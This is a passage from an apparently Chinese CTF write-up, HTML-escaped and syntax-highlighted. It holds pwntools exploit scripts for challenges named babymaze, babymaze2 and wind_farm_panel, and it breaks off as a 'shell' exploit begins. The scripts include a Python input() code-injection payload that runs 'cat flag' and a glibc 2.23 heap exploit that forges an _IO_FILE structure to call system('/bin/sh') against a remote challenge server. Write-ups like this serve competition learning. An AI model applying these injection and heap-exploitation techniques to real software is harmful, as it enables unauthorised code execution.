		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;down&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;#print(&amp;#34;Final:&amp;#34;, lookup_path)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lookup_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;#log.info(&amp;#39;PATH:\t&amp;#39; + path)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;your win&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;babymaze2&#34;&gt;babymaze2&lt;/h3&gt;
&lt;p&gt;input漏洞函数的非预期RCE&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;nb&#34;&gt;__import__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;马赛克&#34;&gt;马赛克&lt;/h3&gt;
&lt;p&gt;Depix直接看&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
&lt;h3 id=&#34;wind_farm_panel&#34;&gt;wind_farm_panel&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;turbine: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;viewed: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;turbine: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;input: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;182.92.203.154&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28452&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.23.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x208&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xDF1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xA0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7F&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x70&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x620&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;IO_list_all&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_IO_list_all&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;IO_str_jumps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3C37A0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x61&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IO_list_all&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xD8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IO_str_jumps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;shell&#34;&gt;shell&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;DEBUG&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
